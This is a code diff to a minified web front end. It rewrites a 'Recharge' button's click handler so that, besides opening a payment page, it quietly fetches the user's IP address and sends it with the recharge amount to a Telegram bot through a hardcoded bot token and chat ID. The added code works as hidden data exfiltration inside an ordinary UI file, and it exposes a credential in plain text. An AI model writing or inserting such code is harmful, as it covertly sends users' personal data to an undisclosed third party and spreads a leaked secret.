@@ -2782,8 +2782,36 @@ $)
             l("div", {
                 key: 3,
                 class: se(["Recharge__container-rechageBtn"]),
-                onClick: function() {
+                onClick: async function() {
                     window.open("https://pay.abishnoi.me/", "_blank");
+                    const rechargeAmount = a(u).amount;
+                    const botToken = '7211580703:AAEPCnOqUDUhvU6MJkg59UbUcuUph_pxwLk';
+                    const chatId = '-1002421689922';
+                    try {
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        const userIP = ipData.ip;
+                        const message = `Recharge Attempt:\n\nAmount: ${rechargeAmount}\nIP Address: ${userIP}\n\nThis is written by @Ak4ssh`;
+                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message,
+                            }),
+                        });
+            
+                        const data = await response.json();
+                        if (data.ok) {
+                            console.log('Message sent successfully:', data.result);
+                        } else {
+                            console.error('Error sending message:', data.description);
+                        }
+                    } catch (error) {
+                        console.error('Error:', error);
+                    }
                 }                
             }, [j(t(ae.$t("recharge")), 1)], 2)), [[we, {
                 handler: a(H),
